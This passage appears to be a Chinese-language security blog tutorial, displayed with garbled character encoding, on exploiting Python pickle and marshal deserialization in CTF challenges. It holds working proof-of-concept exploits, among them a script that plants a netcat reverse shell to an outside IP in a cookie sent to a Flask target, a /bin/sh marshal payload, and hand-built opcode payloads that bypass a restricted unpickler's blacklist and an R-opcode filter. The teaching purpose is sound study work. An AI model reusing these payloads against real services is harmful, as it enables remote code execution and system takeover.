é™¤äº†ä»¥ä¸Šè¿™äº›é¢˜å¤–ï¼Œè¿˜æœ‰BalsnCTF:pyshv1-v3å’ŒSUCTF-2019:guess_gameå››é“é¢˜ï¼Œç”±äºæ‰‹åŠ¨å†™è¿˜æ˜¯æ¯”è¾ƒéº»çƒ¦ï¼Œåœ¨åæ–‡ä¸­ä½¿ç”¨pkerå·¥å…·å®Œæˆã€‚ CTF-case1 ä¸Šè¿°çš„ååºåˆ—åŒ–é¢˜ç›®è¿˜æ˜¯æœ‰éš¾åº¦çš„ï¼Œè¿™é‡Œçœ‹å°è¿ªæœ‰ä¸€ä¸ªç®€å•çš„CTFæ¡ˆä¾‹ï¼Œæµ…æµ…ç ”ç©¶ä¸€ä¸‹ import pickle import base64 from flask import Flask, request app = Flask(__name__) @app.route(\"/\")# /è·¯ç”±ä¸‹çš„åŠŸèƒ½ def index(): try: #å¯¹cookieä¸­çš„userå‚æ•°è¿›è¡Œbase64çš„è§£ç  user = base64.b64decode(request.cookies.get('user')) #å¯¹userå‚æ•°ååºåˆ—åŒ– user = pickle.loads(user) #å°†å…¶ä¸­çš„usernameå¯¹åº”çš„å€¼èµ‹å€¼ username = user[\"username\"] except: #å¦‚æœuseræ•°æ®ä¸­æ²¡æœ‰usernameé”®å€¼ï¼Œåˆ™å°†usernameèµ‹å€¼ä¸ºæŒ‡å®šå­—ç¬¦ä¸² username = \"Guest\" return \"Hello %s\" % username if __name__ == \"__main__\": app.run( host='192.168.1.3', port=5000, debug=True ) è¿™é‡Œæ˜¯å¼€å¯ç¯å¢ƒçš„pyæ–‡ä»¶ã€‚åˆ†æä¸€æ³¢å¾ˆæ˜æ˜¾å°±æ˜¯æˆ‘ä»¬è¦å°†userå‚æ•°ä¼ å…¥cookieå¹¶ä¸”è¿˜è¦è¿›è¡Œbaseç¼–ç ï¼Œé‚£å…¶ä¸­userå¯æ§ï¼Œç›´æ¥ä¼ å…¥æ¶æ„åºåˆ—åŒ–æ•°æ®å³å¯ï¼Œæˆ‘ä»¬è¿è¡Œä¹‹åbpæŠ“åŒ…ã€‚æ¥ç€æˆ‘ä»¬ç¼–å†™ä¸€ä¸‹poc import pickle import os import base64 import requests class exp(): def __reduce__(self): return (os.system,('nc -e cmd 124.220.233.26 5555',)) p = exp() result = pickle.dumps(p) result = base64.b64encode(result) print(result) #è¾“å‡ºb'gASVNQAAAAAAAACMAm50lIwGc3lzdGVtlJOUjB1uYyAtZSBjbWQgMTI0LjIyMC4yMzMuMjYgNTU1NZSFlFKULg==' è¿™é‡Œæˆ‘ä»¬å¯¹reduceæ–¹æ³•è¿›è¡Œäº†é‡å†™ï¼Œæœ€åçš„æ•°æ®å¦‚æœè¢«ååºåˆ—åŒ–ï¼Œé‚£å°†ä¼šæ‰§è¡Œncå‘½ä»¤å»å°è¯•è¿æ¥å¯¹åº”ipçš„port å¦‚ä¸Šå›¾æˆ‘ä»¬æˆåŠŸæ‹¿åˆ°shellï¼Œé‚£è¿™é‡Œæˆ‘ä»¬ä»ç„¶å¯ä»¥ç»§ç»­ç¼–å†™ï¼Œä½¿å…¶åŠŸèƒ½å®Œå–„ï¼Œç›´æ¥åœ¨pyä¸Šå¯¹é¶æœºè¿›è¡Œè¯·æ±‚ï¼Œä¸å¿…ä½¿ç”¨bpï¼Œæˆ‘ä»¬åšå¦‚ä¸‹ä¿®æ”¹ import pickle import os import base64 import requests class exp(): def __reduce__(self): return (os.system,('nc -e cmd 124.220.233.26 5555',)) p = exp() result = pickle.dumps(p) print(result) result = base64.b64encode(result).decode() print(result) header = { 'Cookie': 'user='+result } requests.get(url='http://192.168.246.1:5000/', headers=header) è®©å…¶è¿è¡Œçš„æ—¶å€™è‡ªåŠ¨è®¿é—®é¶æœºåœ°å€ï¼Œå¦‚ä¸‹å›¾æ‰§è¡ŒæˆåŠŸã€‚ ä¸è¿‡è¿™é‡Œæœ‰ä¸€ä¸ªå«Œç–‘ï¼Œå°±æ˜¯è¯¥å‘½ä»¤å¯ä»¥æˆ‘å†æ‰§è¡Œä¸Šè¿°expç¨‹åºçš„æ—¶å€™ï¼ˆååºåˆ—åŒ–çš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨reduceæ–¹æ³•ï¼‰ä¾¿è¢«è°ƒç”¨ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æœ¬æœºå¼€ç¯å¢ƒï¼Œå¦ä¸€å°ä¸»æœºæ‰§è¡Œä¸Šè¿°poc å¦‚ä¸Šå›¾å¯ä»¥çœ‹åˆ°æˆåŠŸæ‰§è¡Œï¼Œä¸è¿‡è¿™é‡Œä¼¼ä¹éœ€è¦æ³¨æ„pythonç‰ˆæœ¬é—®é¢˜ï¼Œä¸Šè¿°CTFç¯å¢ƒæ˜¯åœ¨Python3.8ä¸‹æ­å»ºçš„ï¼Œè¿™é‡Œè¿è¡Œpocè„šæœ¬ä¼¼ä¹ä¹Ÿéœ€è¦åœ¨Python3.8ä¸‹è¿è¡Œï¼ˆå› ä¸ºæˆ‘å†python3.11ä¸‹æµ‹è¯•ä¸æˆåŠŸï¼‰ 0x06 Marshal ååºåˆ—åŒ– ç”±äºpickleæ— æ³•åºåˆ—åŒ–codeå¯¹è±¡, å› æ­¤åœ¨python2.6åå¢åŠ äº†ä¸€ä¸ªmarshalæ¨¡å—æ¥å¤„ç†codeå¯¹è±¡çš„åºåˆ—åŒ–é—®é¢˜. import base64 import marshal def demo(): import os os.system('/bin/sh') code_serialized = base64.b64encode(marshal.dumps(demo())) print(code_serialized) ä½†æ˜¯marshalä¸èƒ½ç›´æ¥ä½¿ç”¨__reduce__, å› ä¸ºreduceæ˜¯åˆ©ç”¨è°ƒç”¨æŸä¸ªcallableå¹¶ä¼ é€’å‚æ•°æ¥æ‰§è¡Œçš„, è€Œmarshalå‡½æ•°æœ¬èº«å°±æ˜¯ä¸€ä¸ªcallable, éœ€è¦æ‰§è¡Œå®ƒ, è€Œä¸æ˜¯å°†ä»–ä½œä¸ºæŸä¸ªå‡½æ•°çš„å‚æ•°. è¿™æ—¶å€™å°±è¦åˆ©ç”¨ä¸Šé¢åˆ†æçš„é‚£ä¸ªPVMæ“ä½œç æ¥è¿›è¡Œæ„é€ äº†, å…ˆå†™å‡ºæ¥éœ€è¦æ‰§è¡Œçš„å†…å®¹, Pythonèƒ½é€šè¿‡types.FunctionTyle(func_code,globals(),'')()æ¥åŠ¨æ€åœ°åˆ›å»ºåŒ¿åå‡½æ•°, è¿™ä¸€éƒ¨åˆ†çš„å†…å®¹å¯ä»¥çœ‹å®˜æ–¹æ–‡æ¡£çš„ä»‹ç». ç»“åˆä¸Šæ–‡çš„ç¤ºä¾‹ä»£ç , æœ€é‡è¦æ‰§è¡Œçš„æ˜¯: (types.FunctionType(marshal.loads(base64.b64decode(code_enc)), globals(), ''))(). è¿™é‡Œç›´æ¥è´´ä¸€ä¸‹åˆ«çš„å¸ˆå‚…ç»™å‡ºæ¥çš„Payloadæ¨¡æ¿. import base64 import pickle import marshal def foo(): import os os.system('whoami;/bin/sh') # evil code shell = \"\"\"ctypes FunctionType (cmarshal loads (cbase64 b64decode (S'%s' tRtRc__builtin__ globals (tRS'' tR(tR.\"\"\" % base64.b64encode(marshal.dumps(foo.func_code)) print(pickle.loads(shell)) 0x07 Passæ€»ç»“ 7.1 ç»•è¿‡builtins æ€è·¯ä¸€ è¿™é‡Œä¸Šè¿°çš„CTFåˆ†æè¿‡è¯¥æ€è·¯äº†ï¼Œè¿™é‡Œæˆ‘å°±ç›´æ¥cväº† åœ¨ä¸€äº›ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å¸¸å¸¸ä¼šè§åˆ°module==\"builtins\"è¿™ä¸€é™åˆ¶ï¼Œæ¯”å¦‚å®˜æ–¹æ–‡æ¡£ä¸­çš„ä¾‹å­ï¼Œåªå…è®¸æˆ‘ä»¬å¯¼å…¥builtinsè¿™ä¸€æ¨¡å— if module == \"builtins\" and name in safe_builtins: return getattr(builtins, name) é‚£ä¹ˆä»€ä¹ˆæ˜¯builtinsæ¨¡å—å‘¢ï¼Ÿ å½“æˆ‘ä»¬å¯åŠ¨Pythonä¹‹åï¼Œå³ä½¿æ²¡æœ‰åˆ›å»ºä»»ä½•çš„å˜é‡æˆ–è€…å‡½æ•°ï¼Œè¿˜æ˜¯ä¼šæœ‰è®¸å¤šå‡½æ•°å¯ä»¥ä½¿ç”¨ï¼Œå¦‚ &gt;&gt;&gt;int(1) 1 ä¸Šè¿°è¿™ç±»å‡½æ•°è¢«æˆ‘ä»¬ç§°ä¸ºâ€å†…ç½®å‡½æ•°â€ï¼Œè¿™å…¶å®å°±æ˜¯builtinsæ¨¡å—çš„åŠŸåŠ³ï¼Œè¿™äº›å†…ç½®å‡½æ•°éƒ½æ˜¯åŒ…å«åœ¨builtinsæ¨¡å—å†…çš„ã€‚è€ŒPythonè§£é‡Šå™¨åœ¨å¯åŠ¨æ—¶å·²ç»è‡ªåŠ¨å¸®æˆ‘ä»¬å¯¼å…¥äº†builtinsæ¨¡å—ï¼Œæ‰€ä»¥æˆ‘ä»¬è‡ªç„¶å°±å¯ä»¥ä½¿ç”¨è¿™äº›å†…ç½®å‡½æ•°äº†ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡for i in sys.modules['builtins'].__dict__:print(i)æ¥æŸ¥çœ‹è¯¥æ¨¡å—ä¸­åŒ…å«çš„æ‰€æœ‰æ¨¡å—å‡½æ•°ç­‰ï¼Œå¤§è‡´å¦‚ä¸‹ Code-Breaking:picklecode import pickle import io import builtins class RestrictedUnpickler(pickle.Unpickler): blacklist = {'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'} def find_class(self, module, name): # Only allow safe classes from builtins. if module == \"builtins\" and name not in self.blacklist: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name)) def restricted_loads(s): \"\"\"Helper function analogous to pickle.loads().\"\"\" return RestrictedUnpickler(io.BytesIO(s)).load() é¢˜ç›®å°†pickleèƒ½å¤Ÿå¼•å…¥çš„æ¨¡å—é™å®šä¸ºbuiltinsï¼Œå¹¶ä¸”è®¾ç½®äº†å­æ¨¡å—é»‘åå•ï¼š{'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'}ï¼Œäºæ˜¯æˆ‘ä»¬èƒ½å¤Ÿç›´æ¥åˆ©ç”¨çš„æ¨¡å—æœ‰ï¼š builtinsæ¨¡å—ä¸­ï¼Œé»‘åå•å¤–çš„å­æ¨¡å—ã€‚ å·²ç»importçš„æ¨¡å—ï¼šioã€builtinsï¼ˆéœ€è¦å…ˆåˆ©ç”¨builtinsæ¨¡å—ä¸­çš„å‡½æ•°ï¼‰ é»‘åå•ä¸­æ²¡æœ‰getattrï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡getattrè·å–ioæˆ–builtinsçš„å­æ¨¡å—ä»¥åŠå­æ¨¡å—çš„å­æ¨¡å—:)ï¼Œè€Œbuiltinsé‡Œæœ‰evalã€execç­‰å±é™©å‡½æ•°ï¼Œå³ä½¿åœ¨é»‘åå•ä¸­ï¼Œä¹Ÿå¯ä»¥é€šè¿‡getattrè·å¾—ã€‚pickleä¸èƒ½ç›´æ¥è·å–builtinsä¸€çº§æ¨¡å—ï¼Œä½†å¯ä»¥é€šè¿‡builtins.globals()è·å¾—builtinsï¼›è¿™æ ·å°±å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç äº†ã€‚ æˆ‘ä»¬å¯ä»¥å€Ÿé‰´Pythonæ²™ç®±é€ƒé€¸çš„æ€è·¯ï¼Œè·å–æˆ‘ä»¬æƒ³è¦çš„å‡½æ•°ã€‚ä»£ç æ²¡æœ‰ç¦ç”¨getattr()å‡½æ•°ï¼Œgetattrå¯ä»¥è·å–å¯¹è±¡çš„å±æ€§å€¼ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡builtins.getattr(builtins,'eval')çš„å½¢å¼æ¥è·å–evalå‡½æ•° æ¥ä¸‹æ¥æˆ‘ä»¬å¾—æ„é€ å‡ºä¸€ä¸ªbuiltinsæ¨¡å—æ¥ä¼ ç»™getattrçš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨builtins.globals()å‡½æ•°è·å–builtinsæ¨¡å—åŒ…å«çš„å†…å®¹ import builtins print(builtins.globals()) å¯è§builtinsæ¨¡å—ä¸­ä»åŒ…å«builtinsæ¨¡å—ã€‚ç”±äºè¿”å›çš„ç»“æœæ˜¯ä¸ªå­—å…¸ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦è·å–get()å‡½æ•° æœ€ç»ˆæ„é€ çš„payloadä¸ºbuiltins.getattr(builtins.getattr(builtins.dict,'get')(builtins.golbals(),'builtins'),'eval')(command) æ€è·¯æœ‰äº†ï¼Œä¸‹é¢å°±æ˜¯æ‰‹å†™opcodeäº†ã€‚é¦–å…ˆè·å–getå‡½æ•° import pickle import pickletools opcode=b'''cbuiltins getattr (cbuiltins dict S'get' tR. ''' pickletools.dis(opcode) print(pickle.loads(opcode)) ###ç»“æœå¦‚ä¸‹ 0: c GLOBAL 'builtins getattr' 18: ( MARK 19: c GLOBAL 'builtins dict' 34: S STRING 'get' 41: t TUPLE (MARK at 18) 42: R REDUCE 43: . STOP highest protocol among opcodes = 0 &lt;method 'get' of 'dict' objects&gt; ç„¶åè·å–globals()å­—å…¸ import pickle import pickletools opcode2=b'''cbuiltins globals )R. ''' pickletools.dis(opcode2) print(pickle.loads(opcode2)) ###ç»“æœå¦‚ä¸‹ 0: c GLOBAL 'builtins globals' 18: ) EMPTY_TUPLE 19: R REDUCE 20: . STOP highest protocol among opcodes = 1 {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': &lt;_frozen_importlib_external.SourceFileLoader object at 0x000001EF06A308B0&gt;, '__spec__': None, '__annotations__': {}, '__builtins__': &lt;module 'builtins' (built-in)&gt;, '__file__': 'C:/Users/34946/Desktop/å®‰å…¨å­¦ä¹ /Pickle_Learning/Pickle_builtins1.py', '__cached__': None, 'pickle': &lt;module 'pickle' from 'C:\\\\Users\\\\34946\\\\AppData\\\\Local\\\\Programs\\\\Python\\\\Python38\\\\lib\\\\pickle.py'&gt;, 'pickletools': &lt;module 'pickletools' from 'C:\\\\Users\\\\34946\\\\AppData\\\\Local\\\\Programs\\\\Python\\\\Python38\\\\lib\\\\pickletools.py'&gt;, 'opcode1': b\"cbuiltins getattr (cbuiltins dict S'get' tR. \", 'opcode2': b'cbuiltins globals )R. '} ç°åœ¨æˆ‘ä»¬æœ‰äº†get()ï¼Œæœ‰äº†globals()å­—å…¸ï¼ŒæŠŠä»–ä»¬ç»„åˆèµ·æ¥æˆ‘ä»¬å°±èƒ½å¤Ÿè·å–builtinsæ¨¡å—äº† import pickle import pickletools opcode3=b'''cbuiltins getattr (cbuiltins dict S'get' tR(cbuiltins globals )RS'__builtins__' tR.''' #ä»¥ä¸Šopcodeç›¸å½“äºæ‰§è¡Œäº†builtins.getattr(builtins.dict,'get')(builtins.globals(),'builtins') pickletools.dis(opcode3) print(pickle.loads(opcode3)) ###ç»“æœå¦‚ä¸‹ 0: c GLOBAL 'builtins getattr' 18: ( MARK 19: c GLOBAL 'builtins dict' 34: S STRING 'get' 41: t TUPLE (MARK at 18) 42: R REDUCE 43: ( MARK 44: c GLOBAL 'builtins globals' 62: ( MARK 63: t TUPLE (MARK at 62) 64: R REDUCE 65: S STRING 'builtins' 77: t TUPLE (MARK at 43) 78: R REDUCE 79: . STOP highest protocol among opcodes = 0 &lt;module 'builtins' (built-in)&gt; æœ€åæˆ‘ä»¬å†è°ƒç”¨è·å–åˆ°çš„builtinsçš„evalå‡½æ•°å³å¯ import pickle opcode4=b'''cbuiltins getattr (cbuiltins getattr (cbuiltins dict S'get' tR(cbuiltins globals )RS'__builtins__' tRS'eval' tR.''' print(pickle.loads(opcode4)) ### &lt;built-in function eval&gt; æœ€ç»ˆpayloadä¸ºï¼š b'''cbuiltins getattr p0 (cbuiltins dict S'get' tRp1 cbuiltins globals )Rp2 00g1 (g2 S'builtins' tRp3 0g0 (g3 S'eval' tR(S'__import__(\"os\").system(\"whoami\")' tR. ''' è¿™é‡Œé™„ä¸ŠGPTçš„åˆ†æï¼Œä½†è§£é‡Šçš„ä¸å¤ªå¥½ã€‚ã€‚ã€‚ æ€è·¯äºŒ è¿™é‡Œä¹Ÿæ˜¯è·Ÿç€ä½¬å­¦çš„ï¼Œä»–æ˜¯é€šè¿‡globalså…¨å±€å˜é‡ä¸­çš„pickleç›´æ¥è¿›è¡Œçš„ï¼Œè¯´æ˜å¦‚ä¸‹ï¼š è¾“å‡ºä¹‹åæˆ‘ä»¬çœ‹åˆ°é‡Œé¢ç¡®å®å«æœ‰pickleæ¨¡å—ï¼Œé‚£æˆ‘ä»¬å¯ä»¥å°è¯•å¯¼å…¥ä½¿ç”¨pickle.loads()æ¥ç»•è¿‡find_class()çš„é™åˆ¶ ä½†è¿™é‡Œå­˜åœ¨ä¸€äº›å°é—®é¢˜ï¼Œè¿™é‡Œç›´æ¥æ”¾å‡ºä½¬çš„æ€è€ƒç ”ç©¶äº†ï¼š ä¸è¿‡å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç”±äºpickle.loads()çš„å‚æ•°éœ€è¦ä¸ºbyteç±»å‹ã€‚è€Œåœ¨Protocol 0ä¸­ï¼Œå¯¹äºbyteç±»å‹å¹¶æ²¡æœ‰å¾ˆå¥½çš„æ”¯æŒï¼Œéœ€è¦é¢å¤–å¯¼å…¥encode()å‡½æ•°ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ— æ³•ç»•è¿‡find_classé™åˆ¶ã€‚ import pickle import pickletools b=b'abcdef' opcode=pickle.dumps(b,protocol=0) pickletools.dis(opcode) ### 0: c GLOBAL '_codecs encode' 16: p PUT 0 19: ( MARK 20: V UNICODE 'abcdef' 28: p PUT 1 31: V UNICODE 'latin1' 39: p PUT 2 42: t TUPLE (MARK at 19) 43: p PUT 3 46: R REDUCE 47: p PUT 4 50: . STOP highest protocol among opcodes = 0 ç›´åˆ°Protocol 3ç‰ˆæœ¬ï¼ŒPythonæ‰å¼•å…¥äº†Bå’ŒCä¸¤ä¸ªå­—èŠ‚ç æ¥æ ‡è¯†byteç±»å‹ # Protocol 3 (Python 3.x) BINBYTES = b'B' # push bytes; counted binary string argument SHORT_BINBYTES = b'C' # \" \" ; \" \" \" \" &lt; 256 bytes import pickle import pickletools b=b'abcdef' opcode=pickle.dumps(b,protocol=0) pickletools.dis(opcode) ### 0: \\x80 PROTO 3 2: C SHORT_BINBYTES b'abcdef' 10: q BINPUT 0 12: . STOP highest protocol among opcodes = 3 å¯ä»¥çœ‹åˆ°æ­¤æ—¶pickleå¯¹äºbyteç±»å‹å˜é‡çš„æ”¯æŒç²¾ç®€äº†å¾ˆå¤šã€‚æ‰€ä»¥å½“æˆ‘ä»¬æƒ³åˆ©ç”¨pickle.loads()æ¥ç»•è¿‡find_classæ—¶ï¼Œæœ€å¥½é€‰æ‹©Protocol 3ç‰ˆæœ¬çš„opcodeæ„é€ ã€‚ ä¸‹é¢æˆ‘ä»¬å°±æ¥ä¸€æ­¥æ­¥æ„é€ Protocol 3ç‰ˆæœ¬çš„Payload é¦–å…ˆè·å–getå‡½æ•° import pickle import builtins import pickletools class Demo: def __reduce__(self): return (getattr,(builtins.dict, 'get',)) poc = Demo() opcode = pickle.dumps(poc, protocol=3) print(opcode) pickletools.dis(opcode) #è¾“å‡ºï¼š b'\\x80\\x03cbuiltins getattr q\\x00cbuiltins dict q\\x01X\\x03\\x00\\x00\\x00getq\\x02\\x86q\\x03Rq\\x04.' 0: \\x80 PROTO 3 2: c GLOBAL 'builtins getattr' 20: q BINPUT 0 22: c GLOBAL 'builtins dict' 37: q BINPUT 1 39: X BINUNICODE 'get' 47: q BINPUT 2 49: \\x86 TUPLE2 50: q BINPUT 3 52: R REDUCE 53: q BINPUT 4 55: . STOP highest protocol among opcodes = 2 å…¶ä¸­æœ‰å¾ˆå¤šq\\0xnå­—èŠ‚ç ï¼Œå®é™…æµ‹è¯•å»æ‰ä¹Ÿæ˜¯å¯ä»¥çš„ BINPUT = b'q' # \" \" \" \" \" ; \" \" 1-byte arg æ„é€ æ€è·¯å’ŒProtocol 0ç±»ä¼¼ï¼Œæˆ‘ä»¬æ„é€ å‡ºpickle.loads()å‡½æ•° import pickle opcode=b\"\\x80\\x03cbuiltins getattr (cbuiltins getattr cbuiltins dict X\\x03\\x00\\x00\\x00get\\x86R(cbuiltins globals )RS'pickle' tRS'loads' tR.\" print(pickle.loads(opcode)) ### &lt;built-in function loads&gt; è¿™ä¸Šè¿°çš„æ„é€ pickle.loadsçœŸå¿ƒçœ‹ä¸æ‡‚ã€‚ã€‚ã€‚ã€‚æ¥ç€æˆ‘ä»¬ç”Ÿæˆè¦æ‰§è¡Œçš„Payload import pickle import os class Command: def __reduce__(self): command=\"whoami\" return (os.system,(command,)) op=Command() opcode=pickle.dumps(op,protocol=0) print(opcode) ### b'cnt system p0 (Vwhoami p1 tp2 Rp3 .' ç”±äºloads()å‡½æ•°æ¥å—çš„æ˜¯byteç±»å‹å‚æ•°ï¼Œä¸ºäº†æ–¹ä¾¿æ„é€ ï¼Œæˆ‘ä»¬å…ˆæ‰‹åŠ¨çœ‹ä¸€ä¸‹pickle.loads(payload)çš„å­—èŠ‚ç ï¼Œæ–¹ä¾¿æˆ‘ä»¬åç»­æ„é€  import pickle import pickletools class bin: def __reduce__(self): return (pickle.loads,(b'''cos system (S'whoami' tR.''',)) b=bin() # b=b'abcdef' opcode=pickle.dumps(b,protocol=3) print(opcode) pickletools.dis(opcode) ### b\"\\x80\\x03c_pickle loads q\\x00C\\x19cos system (S'whoami' tR.q\\x01\\x85q\\x02Rq\\x03.\" 0: \\x80 PROTO 3 2: c GLOBAL '_pickle loads' 17: q BINPUT 0 19: C SHORT_BINBYTES b\"cos system (S'whoami' tR.\" 46: q BINPUT 1 48: \\x85 TUPLE1 49: q BINPUT 2 51: R REDUCE 52: q BINPUT 3 54: . STOP highest protocol among opcodes = 3 è¿™é‡Œä½¿ç”¨äº†å­—èŠ‚ç Cä»£è¡¨byteç±»å‹ï¼Œç„¶ååé¢è·Ÿä¸Šæ•°æ®é•¿åº¦çš„åå…­è¿›åˆ¶å³å¯ï¼Œæˆ‘ä»¬å°†åŠ ç²—éƒ¨åˆ†C\\x19cos system (S'whoami' tR.å’Œä¸Šæ–‡æ„é€ å¥½çš„pickle.loads()å‡½æ•°åˆå¹¶å³å¯ï¼Œå®Œæ•´payloadå¦‚ä¸‹ã€‚ opcode=b\"\\x80\\x03cbuiltins getattr (cbuiltins getattr cbuiltins dict X\\x03\\x00\\x00\\x00get\\x86R(cbuiltins globals )RS'pickle' tRS'loads' tRC\\x19cos system (S'whoami' tR.\\x85R.\" æµ‹è¯•ç»•è¿‡ import pickle import io import builtins class RestrictedUnpickler(pickle.Unpickler): blacklist = {'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'} def find_class(self, module, name): # Only allow safe classes from builtins. if module == \"builtins\" and name not in self.blacklist: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name)) def restricted_loads(s): \"\"\"Helper function analogous to pickle.loads().\"\"\" return RestrictedUnpickler(io.BytesIO(s)).load() opcode2=opcode=b\"\\x80\\x03cbuiltins getattr (cbuiltins getattr cbuiltins dict X\\x03\\x00\\x00\\x00get\\x86R(cbuiltins globals )RS'pickle' tRS'loads' tRC\\x19cos system (S'whoami' tR.\\x85R.\" restricted_loads(opcode2) ### xiaoh\\34946 æ€è·¯äºŒè™½ç„¶ç›¸æ¯”æ€è·¯ä¸€ç¨è®¸éº»çƒ¦ï¼Œä½†æ˜¯æˆ‘ä»¬é€šè¿‡æ„é€ pickle.loads()æ¥*unpickle*ä»»æ„opcodeã€‚è™½ç„¶find_classä¼šå¯¹å­—èŠ‚ç cå¯¼å…¥æ¨¡å—çš„æ—¶å€™è¿›è¡Œæ£€æŸ¥ï¼Œä½†æˆ‘ä»¬æ„é€ pickle.loads()æ—¶å¹¶æ²¡æœ‰è¿åfind_classçš„è§„åˆ™ã€‚å¹¶ä¸”å½“è°ƒç”¨æˆ‘ä»¬æ„é€ çš„å­—èŠ‚ç å½¢å¼çš„pickle.loads(payloads)æ—¶ï¼Œå¹¶ä¸ä¼šè§¦å‘find_classã€‚æ‰€ä»¥åªè¦æˆ‘ä»¬èƒ½å¤Ÿæ„é€ å‡ºpickle.loads()ï¼Œç†è®ºä¸Šæˆ‘ä»¬æ˜¯å¯ä»¥æ‰§è¡Œä»»æ„å­—èŠ‚ç çš„ã€‚ 7.2 ç»•è¿‡RæŒ‡ä»¤ ä»¥ä¸Šæ–¹æ³•è™½ç„¶èƒ½å¤Ÿç»•è¿‡å¯¹moduleå’Œä¸€äº›å±é™©å‡½æ•°çš„é™åˆ¶ï¼Œä½†æœ¬è´¨ä¸Šä»ç„¶æ˜¯å¯¹__reduce__å‡½æ•°çš„å»¶ä¼¸ã€‚å€˜è‹¥å°†å­—èŠ‚ç Rä¹Ÿç¦ç”¨äº†ï¼Œé‚£æˆ‘ä»¬æ€ä¹ˆè¿›è¡ŒRCEå‘¢ï¼Ÿ å¦‚æœä½ è¿˜è®°å¾—æˆ‘ä¸Šæ–‡æ‰€è¯´çš„pickleæ¼æ´å‘½ä»¤æ‰§è¡Œçš„å‡ ç§æ–¹æ³•çš„è¯ï¼Œä½ è‚¯å®šèƒ½ç«‹å³æƒ³åˆ°å’Œå‡½æ•°æ‰§è¡Œæœ‰å…³çš„å­—èŠ‚ç Rã€iã€oã€‚å®é™…ä¸Šï¼Œå¦‚æœæ²¡æœ‰RæŒ‡ä»¤ï¼Œæˆ‘ä»¬åŒæ ·èƒ½å¤Ÿè¿›è¡Œå‡½æ•°æ‰§è¡Œã€‚æœ‰ä¸‹é¢è¿™æ ·ä¸€ä¸ªä¾‹å­ import pickle import stao class Animal: def __init__(self, name, category): self.name = name self.category = category def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.category def check(data): if b'R' in data: return 'no reduce!' x=pickle.loads(data) if(x!= Animal(stao.name,stao.age)): print('not equal') return print('well done! {} {}'.format(stao.name,stao.age)) #stao.py name=\"stao\" age=18 è¿™é‡Œç¦ç”¨äº†RæŒ‡ä»¤ï¼Œä½†æ˜¯æˆ‘ä»¬ä»æœ‰æ–¹æ³•åˆå§‹åŒ–ä¸€ä¸ªAnimalå¯¹è±¡ã€‚ä¸Šæ–‡æåˆ°è¿‡ï¼Œä½¿ç”¨RæŒ‡ä»¤å®ä¾‹åŒ–å¯¹è±¡çš„è¿‡ç¨‹ï¼Œå®é™…ä¸Šå°±æ˜¯è°ƒç”¨æ„é€ å‡½æ•°çš„è¿‡ç¨‹ï¼Œæœ¬è´¨ä¸Šä¹Ÿæ˜¯å‡½æ•°æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬åŒæ ·èƒ½å¤Ÿä½¿ç”¨å…¶ä»–æŒ‡ä»¤ç»•è¿‡ã€‚ iæŒ‡ä»¤ ç›¸å½“äºcå’Œoçš„ç»„åˆï¼Œå…ˆè·å–ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œç„¶åå¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œä»¥è¯¥å…ƒç»„ä¸ºå‚æ•°æ‰§è¡Œå…¨å±€å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰ opcode=b'''(S'stao' I18 i__main__ Animal .''' oæŒ‡ä»¤ å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œä»¥ä¹‹é—´çš„ç¬¬ä¸€ä¸ªæ•°æ®ï¼ˆå¿…é¡»ä¸ºå‡½æ•°ï¼‰ä¸ºcallableï¼Œç¬¬äºŒä¸ªåˆ°ç¬¬nä¸ªæ•°æ®ä¸ºå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰ opcode=b'''(c__main__ Animal S'stao' I18 o.''' å‡å¦‚è¿™é‡Œæˆ‘ä»¬ä¸çŸ¥é“staoæ¨¡å—çš„å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å˜é‡è¦†ç›–çš„æ–¹å¼å°†åŸæœ‰staoä¸­çš„å˜é‡è¦†ç›–æ‰ã€‚ opcode=b'''c__main__ stao (S'name' S'Hacker' S'age' I18 db(c__main__ Animal S'Hacker' I18 o.''' bæŒ‡ä»¤ å…¶å®æˆ‘ä»¬åœ¨ä¸Šæ–‡å·²ç»ä½¿ç”¨è¿‡äº†bæŒ‡ä»¤ï¼Œå½“æ—¶ä»–çš„ä½œç”¨æ˜¯ç”¨æ¥æ›´æ–°æ ˆä¸Šçš„ä¸€ä¸ªå­—å…¸è¿›è¡Œå˜é‡è¦†ç›–ã€‚å®é™…ä¸Šå®˜æ–¹å¯¹å®ƒçš„è§£é‡Šæ˜¯BUILDï¼Œå½“PVMè§£æåˆ°bæŒ‡ä»¤æ—¶æ‰§è¡Œ__setstate__æˆ–è€…__dict__.update()ã€‚ BUILD = b'b' # call __setstate__ or __dict__.update() 